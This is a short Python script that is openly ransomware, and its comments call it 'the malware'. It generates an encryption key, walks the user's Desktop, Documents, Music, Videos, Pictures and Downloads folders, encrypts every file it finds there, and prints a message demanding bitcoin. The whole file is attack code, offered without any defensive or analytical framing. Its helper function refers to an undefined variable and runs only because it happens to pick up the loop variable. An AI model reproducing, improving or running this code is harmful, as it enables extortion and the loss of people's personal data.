
import os 
from cryptography.fernet import Fernet

# Function that encrypts one file
def encrypt_file(file_path, key):
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

# Key generation (this will be used later in the decryption stage)
key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)

# Making a list of directories I want to be encrypted. This is so that the malware does 
# not encrypt important files in directories that may prevent the pc from working
directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]

# traversing all directories and subdirectories 
for root, dirs, files in os.walk('.'):
	if any(dir in root for dir in directories):
		for file in files:
			# This is temporary. This is just to ensure that the important files do not get encrypted. 
			if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "dryrun.py" or file == "README.md":	#if file  is voldemort.py the dont add
				continue
			# getting the full path of the file
			file_path = os.path.join(root, file)

			# function call to encrypt file
			encrypt_file(file_path, key)

print(files)

print("Toss a bitcoin to your hacker O' owner of this pc!")
